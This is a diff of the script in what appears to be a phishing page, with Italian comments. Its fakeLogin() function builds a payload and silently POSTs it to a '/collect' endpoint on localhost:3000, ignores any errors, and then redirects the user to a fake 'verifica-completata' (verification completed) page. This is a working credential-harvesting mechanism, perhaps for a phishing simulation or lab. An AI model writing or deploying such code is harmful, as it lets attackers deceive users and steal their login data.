@@ -82,25 +82,20 @@ function fakeLogin() {
     timestamp: new Date().toISOString()
   };
 
-  /* ===== POST REALE ===== */
+  /* POST reale in background */
   fetch("http://localhost:3000/collect", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
-  }).catch(() => {
-    // eventuale errore ignorato (comportamento realistico)
-  });
+  }).catch(() => {});
 
-  /* ===== REDIRECT COME PRIMA ===== */
-  setTimeout(() => {
-    window.location.href = "verifica-completata.html";
-  }, 700);
+  /* REDIRECT VISIBILE ALL'UTENTE */
+  window.location.href = "verifica-completata.html";
 
   return false;
 }
 </script>
+
 
 </body>
 </html>
